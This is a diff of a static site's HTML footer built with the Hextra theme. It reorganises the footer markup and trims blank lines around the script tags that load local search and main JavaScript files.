-    <div class="hx-flex hx-w-full hx-flex-col hx-items-center sm:hx-items-start"><div class="hx-font-semibold"><a class="hx-flex hx-text-sm hx-items-center hx-gap-1 hx-text-current" target="_blank" rel="noopener noreferrer" title="Hextra GitHub Homepage" href="https://github.com/imfing/hextra">
+      class="hextra-custom-footer hx-max-w-screen-xl hx-pl-[max(env(safe-area-inset-left),1.5rem)] hx-pr-[max(env(safe-area-inset-right),1.5rem)] hx-text-gray-600 dark:hx-text-gray-400"
+    ></div><div
+        class="hx-max-w-screen-xl hx-mx-auto hx-flex hx-justify-center hx-py-12 hx-pl-[max(env(safe-area-inset-left),1.5rem)] hx-pr-[max(env(safe-area-inset-right),1.5rem)] hx-text-gray-600 dark:hx-text-gray-400 md:hx-justify-start"
+      >
+        <div class="hx-flex hx-w-full hx-flex-col hx-items-center sm:hx-items-start"><div class="hx-font-semibold"><a class="hx-flex hx-text-sm hx-items-center hx-gap-1 hx-text-current" target="_blank" rel="noopener noreferrer" title="Hextra GitHub Homepage" href="https://github.com/imfing/hextra">
     <span>Powered by Hextra<svg height=1em class="hx-inline-block ltr:hx-ml-1 rtl:hx-mr-1 hx-align-[-2.5px]" viewBox="0 0 180 180" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="m 105.50024,22.224647 c -9.59169,-5.537563 -21.40871,-5.537563 -31.000093,0 L 39.054693,42.689119 C 29.463353,48.226675 23.55484,58.460531 23.55484,69.535642 v 40.928918 c 0,11.07542 5.908513,21.3092 15.499853,26.84652 l 35.445453,20.46446 c 9.591313,5.53732 21.408404,5.53732 31.000094,0 l 35.44507,-20.46446 c 9.59131,-5.53732 15.49985,-15.7711 15.49985,-26.84652 V 69.535642 c 0,-11.075111 -5.90854,-21.308967 -15.49985,-26.846523 z M 34.112797,85.737639 c -1.384445,2.397827 -1.384445,5.352099 0,7.749927 l 24.781554,42.922974 c 1.38437,2.39783 3.942853,3.87496 6.711592,3.87496 h 49.563107 c 2.76905,0 5.3273,-1.47713 6.71144,-3.87496 l 24.78194,-42.922974 c 1.38414,-2.397828 1.38414,-5.3521 0,-7.749927 L 121.88049,42.814746 c -1.38414,-2.397828 -3.94239,-3.874964 -6.71144,-3.874964 H 65.605944 c -2.768739,0 -5.327223,1.477059 -6.711592,3.874964 z" style="stroke-width:0.774993" /></svg></span>
-  </a></div>
-    </div>
-  </div>
-</footer>
+  </a></div></div>
+      </div></footer>
     
     <script defer src="/js/main.js" integrity=""></script>
-
-
 <script defer src="/lib/flexsearch/flexsearch.bundle.min.0425860527cc9968f9f049421c7a56b39327d475e2e3a8f550416be3a9134327.js" integrity="sha256-BCWGBSfMmWj58ElCHHpWs5Mn1HXi46j1UEFr46kTQyc="></script>
     <script defer src="/en.search.js" integrity=""></script>
-
-
   </body>
 </html>
